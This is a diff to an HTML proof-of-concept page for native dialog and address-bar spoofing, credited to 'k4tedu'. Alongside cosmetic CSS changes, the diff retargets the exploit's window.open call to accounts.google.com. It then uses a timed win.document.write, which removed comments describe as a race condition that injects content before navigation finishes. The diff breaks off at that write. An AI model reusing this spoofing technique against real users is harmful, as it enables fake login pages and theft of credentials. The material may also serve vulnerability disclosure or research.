@@ -13,6 +13,16 @@
       margin: 0;
       font-family: sans-serif;
     }
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 12px;
+    }
+    h2, h3 {
+      margin: 0;
+    }
     button {
       padding: 12px 24px;
       font-size: 18px;
@@ -21,16 +31,15 @@
 </head>
 <body>
 
-  <h2 style="color:red;">Native Dialog & Address Bar Spoofing PoC</h2>
-  <h3>Attacker-controlled page</h3>
-  <button onclick="executeSpoof()">Start PoC</button>
+  <div class="content">
+    <h2 style="color:red;">Native Dialog & Address Bar Spoofing PoC by k4tedu</h2>
+    <h3>Attacker-controlled page</h3>
+    <button onclick="executeSpoof()">Start PoC</button>
+  </div>
 
   <script>
     function executeSpoof() {
-      // 1. Buka URL target dengan path spesifik untuk menghindari pengalihan Universal Links iOS
-      let win = window.open('https://www.google.com/csi', '_top');
-
-      // 2. Race Condition: Injeksi konten DOM sebelum pemutusan konteks navigasi selesai
+      let win = window.open('https://accounts.google.com/', '_top');
       setTimeout(() => {
         try {
           win.document.write(`
